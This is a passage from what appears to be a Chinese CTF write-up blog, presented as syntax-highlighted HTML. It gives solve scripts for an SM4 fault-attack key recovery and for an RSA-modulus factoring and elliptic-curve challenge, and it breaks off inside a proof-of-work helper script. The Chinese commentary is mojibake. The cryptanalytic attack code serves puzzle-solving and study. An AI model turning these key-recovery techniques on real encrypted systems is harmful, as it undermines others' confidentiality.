class="number">33</span>])</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(ict,icf)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="title class_">SM4</span>_BOXES_TABLE[ict[i]^guess]^<span class="title class_">SM4</span>_BOXES_TABLE[icf[i]^guess]==dt[i]:</span><br><span class="line">            rkl0[i].<span class="title function_">add</span>(guess)</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(rkl0)            </span><br><span class="line"></span><br><span class="line">rk=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> rki <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="title function_">print</span>(rki)</span><br><span class="line">    ctt=[bytes.<span class="title function_">fromhex</span>(ct[rki][:<span class="number">32</span>]),bytes.<span class="title function_">fromhex</span>(ct[rki][<span class="number">32</span>:])]</span><br><span class="line">    ctf=[bytes.<span class="title function_">fromhex</span>(ct[rki+<span class="number">1</span>][:<span class="number">32</span>]),bytes.<span class="title function_">fromhex</span>(ct[rki+<span class="number">1</span>][<span class="number">32</span>:])]    </span><br><span class="line">    buft=[<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line">    buff=[<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line">    rkl=[[<span class="title function_">set</span>(),<span class="title function_">set</span>()] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">for</span> times <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">2</span>):</span><br><span class="line">        ct0t=ctt[times]    </span><br><span class="line">        ct0f=ctf[times]    </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">4</span>):</span><br><span class="line">            buft[-i-<span class="number">1</span>]=<span class="title function_">l2i</span>(ct0t[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>])</span><br><span class="line">            buff[-i-<span class="number">1</span>]=<span class="title function_">l2i</span>(ct0f[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>])</span><br><span class="line">        buft[<span class="number">32</span>:]=<span class="title function_">invpfunc</span>(buft[<span class="number">32</span>:],<span class="variable constant_">WDB</span>)</span><br><span class="line">        buff[<span class="number">32</span>:]=<span class="title function_">invpfunc</span>(buff[<span class="number">32</span>:],<span class="variable constant_">WDB</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(rki):</span><br><span class="line">            buff[<span class="number">31</span>-i] = buff[<span class="number">35</span>-i] ^ <span class="title function_">tfunc</span>(buff[<span class="number">34</span>-i]^buff[<span class="number">33</span>-i]^buff[<span class="number">32</span>-i]^rk[i])</span><br><span class="line">            buff[<span class="number">31</span>-<span class="attr">i</span>:<span class="number">35</span>-i]=<span class="title function_">invpfunc</span>(buff[<span class="number">31</span>-<span class="attr">i</span>:<span class="number">35</span>-i],<span class="variable constant_">WDB</span>)</span><br><span class="line">            buft[<span class="number">31</span>-i] = buft[<span class="number">35</span>-i] ^ <span class="title function_">tfunc</span>(buft[<span class="number">34</span>-i]^buft[<span class="number">33</span>-i]^buft[<span class="number">32</span>-i]^rk[i])</span><br><span class="line">            buft[<span class="number">31</span>-<span class="attr">i</span>:<span class="number">35</span>-i]=<span class="title function_">invpfunc</span>(buft[<span class="number">31</span>-<span class="attr">i</span>:<span class="number">35</span>-i],<span class="variable constant_">WDB</span>)</span><br><span class="line">        <span class="title function_">assert</span>(<span class="title function_">invpfunc</span>(buft[<span class="number">31</span>-<span class="attr">rki</span>:],<span class="variable constant_">DB</span>)[<span class="number">1</span>:]==<span class="title function_">invpfunc</span>(buff[<span class="number">31</span>-<span class="attr">rki</span>:],<span class="variable constant_">WDB</span>)[<span class="number">1</span>:])</span><br><span class="line">    </span><br><span class="line">        ict=<span class="title function_">i2l</span>(buft[<span class="number">32</span>-rki]^buft[<span class="number">34</span>-rki]^buft[<span class="number">33</span>-rki])</span><br><span class="line">        icf=<span class="title function_">i2l</span>(buff[<span class="number">32</span>-rki]^buff[<span class="number">34</span>-rki]^buff[<span class="number">33</span>-rki])</span><br><span class="line">        dt=<span class="title function_">i2l</span>(<span class="title function_">d</span>(buff[<span class="number">35</span>-rki]^buft[<span class="number">35</span>-rki]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">for</span> guess <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">256</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="title class_">SM4</span>_BOXES_TABLE[ict[i]^guess]^<span class="title class_">SM4</span>_BOXES_TABLE[icf[i]^guess]==dt[i]:</span><br><span class="line">                    rkl[i][times].<span class="title function_">add</span>(guess)</span><br><span class="line">        <span class="title function_">print</span>(rkl)</span><br><span class="line"></span><br><span class="line">    rkn=[(rkl[i][<span class="number">0</span>]&amp;rkl[i][<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">4</span>)]</span><br><span class="line">    <span class="title function_">print</span>(rkn)</span><br><span class="line">    <span class="title function_">assert</span>(<span class="title function_">all</span>([<span class="title function_">len</span>(i)==<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> rkn]))</span><br><span class="line">    rkn=[<span class="title function_">list</span>(i)[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> rkn]</span><br><span class="line">    rk.<span class="title function_">append</span>(<span class="title function_">l2i</span>(rkn))</span><br><span class="line">    </span><br><span class="line"><span class="title function_">print</span>(rk[::-<span class="number">1</span>])</span><br><span class="line">def <span class="title function_">inv_expand_key</span>(rk):</span><br><span class="line">    k = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line">    k[-<span class="number">4</span>:] = rk</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">32</span>):</span><br><span class="line">        k[-i - <span class="number">5</span>] = k[-i-<span class="number">1</span>] ^ (<span class="title function_">round_key</span>(k[-i - <span class="number">2</span>] ^ k[-i - <span class="number">3</span>] ^ k[-i -<span class="number">4</span>] ^ <span class="title class_">SM4</span>_CK[-i-<span class="number">1</span>]))</span><br><span class="line">    <span class="variable constant_">MK</span>=<span class="title function_">xor</span>(k[<span class="number">0</span>:<span class="number">4</span>],<span class="title class_">SM4</span>_FK)    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable constant_">MK</span>,k[<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="title class_">Crypto</span>.<span class="property">Util</span>.<span class="property">number</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">MK</span>,rks=<span class="title function_">inv_expand_key</span>(rk[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="variable constant_">MK</span>,rks)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">inv_one_round</span>(bk, rk, dt):</span><br><span class="line">    out = []</span><br><span class="line">    buf = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line">    buf[:<span class="number">4</span>] = [<span class="title function_">l2i</span>(bk[:<span class="number">4</span>]), <span class="title function_">l2i</span>(bk[<span class="number">4</span>:<span class="number">8</span>]), <span class="title function_">l2i</span>(bk[<span class="number">8</span>:<span class="number">12</span>]), <span class="title function_">l2i</span>(bk[<span class="number">12</span>:])]</span><br><span class="line">    buf=buf[::-<span class="number">1</span>]</span><br><span class="line">    <span class="title function_">dance</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">31</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        buf[i+<span class="number">1</span>:i+<span class="number">5</span>] = <span class="title function_">invpfunc</span>(buf[i+<span class="number">1</span>:i+<span class="number">5</span>],<span class="title class_">Dance</span>_Box)</span><br><span class="line">        buf[i] = buf[i+<span class="number">4</span>] ^ <span class="title function_">tfunc</span>(buf[i+<span class="number">1</span>]^buf[i+<span class="number">2</span>]^buf[i+<span class="number">3</span>]^rk[i])</span><br><span class="line">        <span class="keyword">if</span> dt == <span class="attr">i</span>:</span><br><span class="line">            <span class="title function_">dance</span>()</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">4</span>):</span><br><span class="line">        out += <span class="title function_">i2l</span>(buf[_])</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">bytes</span>(<span class="title function_">inv_one_round</span>(bytes.<span class="title function_">fromhex</span>(ct[<span class="number">0</span>][:<span class="number">32</span>]),rks,<span class="number">31</span>))+<span class="title function_">bytes</span>(<span class="title function_">inv_one_round</span>(bytes.<span class="title function_">fromhex</span>(ct[<span class="number">0</span>][<span class="number">32</span>:]),rks,<span class="number">31</span>)))</span><br><span class="line"><span class="title function_">exit</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">10</span>):</span><br><span class="line">    key=<span class="title function_">long_to_bytes</span>(<span class="title function_">getrandbits</span>(<span class="number">128</span>))</span><br><span class="line">    rk=<span class="title function_">expand_key</span>(key)</span><br><span class="line">    ans=<span class="title function_">one_round</span>(key,rk,<span class="number">31</span>)</span><br><span class="line">    key1=<span class="title function_">inv_one_round</span>(ans,rk,<span class="number">31</span>)</span><br><span class="line">    <span class="title function_">print</span>(key,key1)</span><br></pre></td></tr></table></figure>

<h3 id="e20k"><a href="#e20k" class="headerlink" title="e20k"></a>e20k</h3><p>æ³¨æ„åˆ°n&#x3D;p<em>q</em>r&#x3D;p<em>q</em>(2q-1) -&gt;2n&#x3D;p<em>2q</em>(2q-1)&#x3D;p<em>r</em>(r+1)ï¼Œä¸€çœ¼åˆ†åœ†å¤šé¡¹å¼ï¼Œæ‰¾ä¸ªè„šæœ¬ï¼Œåˆ†è§£n</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">from</span> <span class="title class_">Crypto</span>.<span class="property">Util</span>.<span class="property">number</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">P.&lt;x, y&gt; = <span class="title class_">PolynomialRing</span>(<span class="variable constant_">ZZ</span>)</span><br><span class="line">R.&lt;z&gt; = <span class="title class_">PolynomialRing</span>(<span class="variable constant_">ZZ</span>)</span><br><span class="line">z = R.<span class="title function_">gens</span>()[<span class="number">0</span>]</span><br><span class="line">def <span class="title function_">calculate_eta_all</span>(eta, aa, bb, m, k):</span><br><span class="line">    eta_all = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(k):</span><br><span class="line">        temp = eta^(aa^i)</span><br><span class="line">        add = temp</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="title function_">range</span>((m-<span class="number">1</span>)<span class="comment">//k - 1):</span></span><br><span class="line">            add = add^bb</span><br><span class="line">            temp += add</span><br><span class="line">        eta_all.<span class="title function_">append</span>(temp)</span><br><span class="line">    <span class="keyword">return</span> eta_all</span><br><span class="line"></span><br><span class="line">def <span class="title function_">calculate_irreducible_polynomial</span>(eta_all, m):</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(k):</span><br><span class="line">        h *= (y - eta_all[i].<span class="title function_">lift</span>())</span><br><span class="line"></span><br><span class="line">    d = <span class="title function_">sum</span>([x^i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(m)])</span><br><span class="line">    f_irreducible = h % d</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> f_irreducible, d</span><br><span class="line"></span><br><span class="line">def <span class="title function_">pad_polynomial_coefficients</span>(f, m):</span><br><span class="line">    tmp = f.<span class="title function_">list</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="title function_">len</span>(tmp) &lt; <span class="attr">m</span>:</span><br><span class="line">        tmp.<span class="title function_">append</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line">    </span><br><span class="line">def <span class="title class_">Factoring</span>_with_Cyclotomic_Polynomials(k, n):</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Phi</span> = <span class="title function_">cyclotomic_polynomial</span>(k)</span><br><span class="line">    <span class="title class_">Psi</span> = (z^k-<span class="number">1</span>)<span class="comment">//(cyclotomic_polynomial(k))</span></span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&#x27;Cyclotomic_Polynomials Phi:&#x27;</span>, <span class="title class_">Phi</span>)</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&#x27;Psi:&#x27;</span>, <span class="title class_">Psi</span>)</span><br><span class="line">    m = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="title class_">True</span>:</span><br><span class="line">        useful = <span class="title class_">False</span></span><br><span class="line">        <span class="keyword">while</span> not <span class="attr">useful</span>:</span><br><span class="line">            m += k</span><br><span class="line">            <span class="keyword">if</span> not <span class="title function_">isPrime</span>(m):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            aa = <span class="title function_">primitive_root</span>(m)</span><br><span class="line">            ff = x^m - <span class="number">1</span></span><br><span class="line">            Q = P.<span class="title function_">quo</span>(ff)</span><br><span class="line">            eta = Q.<span class="title function_">gens</span>()[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">for</span> bb <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">2</span>, m):</span><br><span class="line">                <span class="keyword">if</span> (bb^((m-<span class="number">1</span>)<span class="comment">//k)-1)//(bb-1) % m:</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                eta_all = <span class="title function_">calculate_eta_all</span>(eta, aa, bb, m, k)</span><br><span class="line">                f_irreducible, d = <span class="title function_">calculate_irreducible_polynomial</span>(eta_all, m)</span><br><span class="line">                <span class="keyword">if</span> f_irreducible.<span class="title function_">subs</span>(y=<span class="number">0</span>) <span class="keyword">in</span> <span class="attr">ZZ</span>:</span><br><span class="line">                    useful = <span class="title class_">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        eta0 = eta_all[<span class="number">0</span>]</span><br><span class="line">        eta0_pow = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">2</span>, k):</span><br><span class="line">            eta0_pow_i = (eta0^i).<span class="title function_">lift</span>().<span class="title function_">subs</span>(x=z)</span><br><span class="line">            constant_term = eta0_pow_i.<span class="title function_">list</span>()[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> constant_term != <span class="number">0</span>:</span><br><span class="line">                dd = (d-<span class="number">1</span>).<span class="title function_">subs</span>(x=z)</span><br><span class="line">                eta0_pow_i = eta0_pow_i - constant_term - constant_term * dd</span><br><span class="line">            eta0_pow.<span class="title function_">append</span>(eta0_pow_i)</span><br><span class="line"></span><br><span class="line">        coeff = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(k):</span><br><span class="line">            coeff.<span class="title function_">append</span>(<span class="title function_">pad_polynomial_coefficients</span>(eta_all[i].<span class="title function_">lift</span>().<span class="title function_">subs</span>(x=z), m))</span><br><span class="line"></span><br><span class="line">        A = <span class="title function_">matrix</span>(<span class="variable constant_">QQ</span>, coeff)</span><br><span class="line">        terget = [[-<span class="number">1</span>]*k, [<span class="number">1</span>] + [<span class="number">0</span>]*(k-<span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(k-<span class="number">2</span>):</span><br><span class="line">            terget.<span class="title function_">append</span>(A.<span class="title function_">solve_left</span>(<span class="title function_">vector</span>(<span class="title function_">pad_polynomial_coefficients</span>(eta0_pow[i], m))))</span><br><span class="line"></span><br><span class="line">        B = <span class="title function_">matrix</span>(<span class="variable constant_">QQ</span>, terget)</span><br><span class="line"></span><br><span class="line">        U.&lt;w&gt; = <span class="title class_">PolynomialRing</span>(<span class="variable constant_">QQ</span>)</span><br><span class="line">        w = U.<span class="title function_">gens</span>()[<span class="number">0</span>]</span><br><span class="line">        eta1 = <span class="title function_">U</span>(<span class="title function_">list</span>((B^-<span class="number">1</span>)[<span class="number">1</span>]))</span><br><span class="line">        f = f_irreducible.<span class="title function_">subs</span>(y=w)</span><br><span class="line">        V = U.<span class="title function_">quo</span>(f)</span><br><span class="line">        eta1 = <span class="title function_">V</span>(eta1)</span><br><span class="line"></span><br><span class="line">        C = <span class="title function_">matrix</span>(<span class="variable constant_">QQ</span>, k, k)</span><br><span class="line">        C[<span class="number">0</span>, <span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">1</span>, k):</span><br><span class="line">            tmp = eta1^i</span><br><span class="line">            C[i] = <span class="title function_">pad_polynomial_coefficients</span>(tmp, k)</span><br><span class="line"></span><br><span class="line">        K.&lt;s&gt; = <span class="title class_">PolynomialRing</span>(<span class="title class_">Zmod</span>(n))</span><br><span class="line">        f_modulo = f_irreducible.<span class="title function_">subs</span>(y=s)</span><br><span class="line">        K_quo = K.<span class="title function_">quo</span>(f_modulo)</span><br><span class="line"></span><br><span class="line">        f_ZZ = f_irreducible.<span class="title function_">subs</span>(y=z)</span><br><span class="line">        <span class="attr">try</span>:</span><br><span class="line">            sigma = <span class="title function_">matrix</span>(<span class="title class_">Zmod</span>(n), C)</span><br><span class="line">        <span class="attr">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">while</span> <span class="title class_">True</span>:</span><br><span class="line">            g = R.<span class="title function_">random_element</span>(k-<span class="number">1</span>)</span><br><span class="line">            <span class="attr">try</span>:</span><br><span class="line">                kk, _, h = <span class="title function_">xgcd</span>(f_ZZ, g)</span><br><span class="line">                h = <span class="title function_">inverse_mod</span>(<span class="title function_">int</span>(kk), n) * h</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="attr">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        g = g.<span class="title function_">subs</span>(y=x)       </span><br><span class="line">        g_Q = <span class="title function_">K_quo</span>(g)</span><br><span class="line">        h_Q = <span class="title function_">K_quo</span>(h)</span><br><span class="line">        assert g_Q * h_Q == <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="title class_">Psi</span>_coefficients = <span class="title class_">Psi</span>.<span class="title function_">coefficients</span>()</span><br><span class="line">        <span class="title class_">Psi</span>_monomials = <span class="title class_">Psi</span>.<span class="title function_">monomials</span>()[::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="title class_">Psi</span>_coefficients[<span class="number">0</span>] &lt; <span class="number">0</span>:</span><br><span class="line">            yy = h_Q^(-<span class="title class_">Psi</span>_coefficients[<span class="number">0</span>]) </span><br><span class="line">        <span class="attr">else</span>:</span><br><span class="line">            yy = g_Q^(<span class="title class_">Psi</span>_coefficients[<span class="number">0</span>]) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">1</span>, <span class="title function_">len</span>(<span class="title class_">Psi</span>_monomials)):</span><br><span class="line">            <span class="keyword">if</span> <span class="title class_">Psi</span>_coefficients[i] &lt; <span class="number">0</span>:</span><br><span class="line">                yy *= <span class="title function_">K_quo</span>(<span class="title function_">list</span>(<span class="title function_">vector</span>(<span class="title function_">list</span>(h_Q^(-<span class="title class_">Psi</span>_coefficients[i]))) * <span class="title class_">Psi</span>_monomials[i](sigma)))</span><br><span class="line">            <span class="attr">else</span>:</span><br><span class="line">                yy *= <span class="title function_">K_quo</span>(<span class="title function_">list</span>(<span class="title function_">vector</span>(<span class="title function_">list</span>(g_Q^(<span class="title class_">Psi</span>_coefficients[i]))) * <span class="title class_">Psi</span>_monomials[i](sigma)))</span><br><span class="line">        yy = yy^n</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">gcd</span>(yy[<span class="number">1</span>], n) &gt; <span class="number">2</span>**<span class="number">20</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">gcd</span>(yy[<span class="number">1</span>], n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    k = <span class="number">2</span>  # the k-th cyclotomic_polynomial</span><br><span class="line">    <span class="title class_">Phi</span> = <span class="title function_">cyclotomic_polynomial</span>(k)</span><br><span class="line">    N = <span class="title function_">int</span>(<span class="title function_">input</span>())</span><br><span class="line">    pp = <span class="title class_">Factoring</span>_with_Cyclotomic_Polynomials(k, N)</span><br><span class="line">    assert not N % <span class="title function_">int</span>(pp)</span><br><span class="line">    r=<span class="title function_">int</span>(pp)</span><br><span class="line">    q=(r+<span class="number">1</span>)<span class="comment">//2</span></span><br><span class="line">    p=N<span class="comment">//(q*r)</span></span><br><span class="line">    assert <span class="title function_">is_prime</span>(r)</span><br><span class="line">    assert <span class="title function_">is_prime</span>(q)</span><br><span class="line">    assert <span class="title function_">is_prime</span>(p)</span><br><span class="line">    assert N%p==<span class="number">0</span></span><br><span class="line">    assert <span class="title function_">is_prime</span>(q)</span><br><span class="line">    assert <span class="title function_">is_prime</span>(r)</span><br><span class="line"></span><br><span class="line">    E=<span class="title class_">EllipticCurve</span>(<span class="title class_">Zmod</span>(N), [<span class="number">3</span>, <span class="number">7</span>])</span><br><span class="line">    y2=lambda x :x^<span class="number">3</span>+<span class="number">3</span>*x+<span class="number">7</span></span><br><span class="line">    fs=[p,q,r]</span><br><span class="line">    <span class="variable constant_">E1</span>=<span class="title class_">EllipticCurve</span>(<span class="title class_">Zmod</span>(p), [<span class="number">3</span>, <span class="number">7</span>])</span><br><span class="line">    <span class="variable constant_">E2</span>=<span class="title class_">EllipticCurve</span>(<span class="title class_">Zmod</span>(q), [<span class="number">3</span>, <span class="number">7</span>])</span><br><span class="line">    <span class="variable constant_">E3</span>=<span class="title class_">EllipticCurve</span>(<span class="title class_">Zmod</span>(r), [<span class="number">3</span>, <span class="number">7</span>])</span><br><span class="line">    n1=<span class="variable constant_">E1</span>.<span class="title function_">order</span>()</span><br><span class="line">    n2=<span class="variable constant_">E2</span>.<span class="title function_">order</span>()</span><br><span class="line">    n3=<span class="variable constant_">E3</span>.<span class="title function_">order</span>()</span><br><span class="line">    ns=[n1,n2,n3]</span><br><span class="line">    <span class="attr">try</span>:</span><br><span class="line">        <span class="title function_">assert</span>(<span class="title function_">all</span>([ni%<span class="number">3</span>==<span class="number">0</span> <span class="keyword">for</span> ni <span class="keyword">in</span> ns]))</span><br><span class="line">    <span class="attr">except</span>:</span><br><span class="line">        <span class="title function_">print</span>(<span class="string">&quot;wrong&quot;</span>)</span><br><span class="line">        <span class="title function_">exit</span>()</span><br><span class="line">    <span class="variable constant_">O1</span>=<span class="variable constant_">E1</span>.<span class="title function_">random_point</span>()*n1</span><br><span class="line">    <span class="variable constant_">P1</span>=<span class="variable constant_">E1</span>.<span class="title function_">random_point</span>()</span><br><span class="line">    h1=n1<span class="comment">//3</span></span><br><span class="line">    <span class="keyword">while</span> h1*<span class="variable constant_">P1</span>==<span class="attr">O1</span>:</span><br><span class="line">        <span class="variable constant_">P1</span>=<span class="variable constant_">E1</span>.<span class="title function_">random_point</span>()</span><br><span class="line">        </span><br><span class="line">    <span class="variable constant_">O2</span>=<span class="variable constant_">E2</span>.<span class="title function_">random_point</span>()*n2</span><br><span class="line">    <span class="variable constant_">P2</span>=<span class="variable constant_">E2</span>.<span class="title function_">random_point</span>()</span><br><span class="line">    h2=n2<span class="comment">//3</span></span><br><span class="line">    <span class="keyword">while</span> h2*<span class="variable constant_">P2</span>==<span class="attr">O2</span>:</span><br><span class="line">        <span class="variable constant_">P2</span>=<span class="variable constant_">E2</span>.<span class="title function_">random_point</span>()</span><br><span class="line"></span><br><span class="line">    <span class="variable constant_">O3</span>=<span class="variable constant_">E3</span>.<span class="title function_">random_point</span>()*n3</span><br><span class="line">    <span class="variable constant_">P3</span>=<span class="variable constant_">E3</span>.<span class="title function_">random_point</span>()</span><br><span class="line">    h3=n3<span class="comment">//3</span></span><br><span class="line">    <span class="keyword">while</span> h3*<span class="variable constant_">P3</span>==<span class="attr">O3</span>:</span><br><span class="line">        <span class="variable constant_">P3</span>=<span class="variable constant_">E3</span>.<span class="title function_">random_point</span>()</span><br><span class="line">        </span><br><span class="line">    <span class="title class_">Qs</span>=[h1*<span class="variable constant_">P1</span>,h2*<span class="variable constant_">P2</span>,h3*<span class="variable constant_">P3</span>]</span><br><span class="line">    xs=[<span class="title function_">int</span>(<span class="title class_">Qi</span>.<span class="title function_">xy</span>()[<span class="number">0</span>]) <span class="keyword">for</span> <span class="title class_">Qi</span> <span class="keyword">in</span> <span class="title class_">Qs</span>]</span><br><span class="line">    x=<span class="title function_">crt</span>(xs,fs)</span><br><span class="line">    ys=[<span class="title function_">int</span>(<span class="title class_">Qi</span>.<span class="title function_">xy</span>()[<span class="number">1</span>]) <span class="keyword">for</span> <span class="title class_">Qi</span> <span class="keyword">in</span> <span class="title class_">Qs</span>]</span><br><span class="line">    y=<span class="title function_">crt</span>(ys,fs)</span><br><span class="line">   </span><br><span class="line">    <span class="title function_">print</span>(x,<span class="string">&quot;,&quot;</span>,y)</span><br><span class="line">    <span class="title function_">print</span>(<span class="title function_">E</span>(x,y))</span><br><span class="line">    <span class="title function_">print</span>(<span class="title function_">E</span>(x,y)*<span class="number">4</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>å‘ç°è¿­ä»£æœ‰ä¸ªA:&#x3D;4*Açš„ç»“æ„ï¼Œæ¥éƒ½æ¥äº†ï¼Œåˆ†è§£æ„é€ ä¸€ä¸‹Aä¸ºé˜¶æ˜¯3çš„ç‚¹ï¼Œä¸è¿‡éœ€è¦å¤šçˆ†ç ´powï¼ˆæ ¡å›­ç½‘è¢«åˆ¶è£äº†ï¼Œè·å–äº†ä¸€ä»½æœ¬åœ°powè„šæœ¬æ¥ç”¨ï¼‰</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python3</span></span><br><span class="line"># -*- <span class="attr">coding</span>: utf-<span class="number">8</span> -*-</span><br><span class="line"># <span class="title class_">Copyright</span> <span class="number">2020</span> <span class="title class_">Google</span> <span class="variable constant_">LLC</span></span><br><span class="line">#</span><br><span class="line"># <span class="title class_">Licensed</span> under the <span class="title class_">Apache</span> <span class="title class_">License</span>, <span class="title class_">Version</span> <span class="number">2.0</span> (the <span class="string">&quot;License&quot;</span>);</span><br><span class="line"># you may not use <span class="variable language_">this</span> file except <span class="keyword">in</span> compliance <span class="keyword">with</span> the <span class="title class_">License</span>.</span><br><span class="line"># <span class="title class_">You</span> may obtain a copy <span class="keyword">of</span> the <span class="title class_">License</span> at</span><br><span class="line">#</span><br><span class="line">#     <span class="attr">https</span>:<span class="comment">//www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line">#</span><br><span class="line"># <span class="title class_">Unless</span> required by applicable law or agreed to <span class="keyword">in</span> writing, software</span><br><span class="line"># distributed under the <span class="title class_">License</span> is distributed on an <span class="string">&quot;AS IS&quot;</span> <span class="variable constant_">BASIS</span>,</span><br><span class="line"># <span class="variable constant_">WITHOUT</span> <span class="variable constant_">WARRANTIES</span> <span class="variable constant_">OR</span> <span class="variable constant_">CONDITIONS</span> <span class="variable constant_">OF</span> <span class="variable constant_">ANY</span> <span class="variable constant_">KIND</span>, either express or implied.</span><br><span class="line"># <span class="title class_">See</span> the <span class="title class_">License</span> <span class="keyword">for</span> the specific language governing permissions and</span><br><span class="line"># limitations under the <span class="title class_">License</span>.</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="attr">try</span>:</span><br><span class="line">    <span class="keyword">import</span> gmpy2</span><br><span class="line">    <span class="variable constant_">HAVE_GMP</span> = <span class="title class_">True</span></span><br><span class="line">except <span class="title class_">ImportError</span>:</span><br><span class="line">    <span class="variable constant_">HAVE_GMP</span> = <span class="title class_">False</span></span><br><span class="line">    sys.<span class="property">stderr</span>.<span class="title function_">write</span>(<span class="string">&quot;[NOTICE] Running 10x slower, gotta go fast? pip3 install gmpy2\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable constant_">VERSION</span> = <span class="string">&#x27;s&#x27;</span></span><br><span class="line"><span class="variable constant_">MODULUS</span> = <span class="number">2</span>**<span class="number">1279</span>-<span class="number">1</span></span><br><span class="line"><span class="variable constant_">CHALSIZE</span> = <span class="number">2</span>**<span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="variable 